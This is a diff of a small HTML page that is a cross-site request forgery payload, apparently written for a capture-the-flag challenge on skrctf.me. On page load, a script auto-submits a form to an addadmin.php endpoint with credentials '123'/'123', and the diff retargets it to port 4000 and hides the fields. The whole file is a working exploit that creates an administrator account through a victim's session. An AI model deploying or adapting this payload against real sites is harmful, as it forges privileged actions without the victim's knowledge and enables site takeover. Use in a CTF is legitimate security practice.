@@ -1,8 +1,8 @@
 <html>
   <body>
-    <form id="csrf" action="https://skrctf.me/ports/5f37ebf69df84fa35f32c5e3298ce375/addadmin.php" method="POST">
-      <input type="text" name="username" value="123">
-      <input type="password" name="password" value="123">
+    <form id="csrf" action="http://skrctf.me:4000/addadmin.php" method="POST">
+      <input type="hidden" name="username" value="123">
+      <input type="hidden" name="password" value="123">
     </form>
     <script>
       document.getElementById("csrf").submit();
